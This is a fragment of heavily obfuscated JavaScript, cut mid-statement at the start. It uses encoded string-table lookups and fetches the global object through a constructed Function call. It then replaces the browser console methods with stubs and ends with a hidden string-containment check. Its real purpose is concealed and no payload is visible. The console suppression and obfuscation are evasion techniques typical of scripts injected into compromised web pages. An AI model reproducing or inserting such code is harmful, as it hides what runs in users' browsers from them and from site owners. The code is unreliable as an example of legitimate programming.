u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};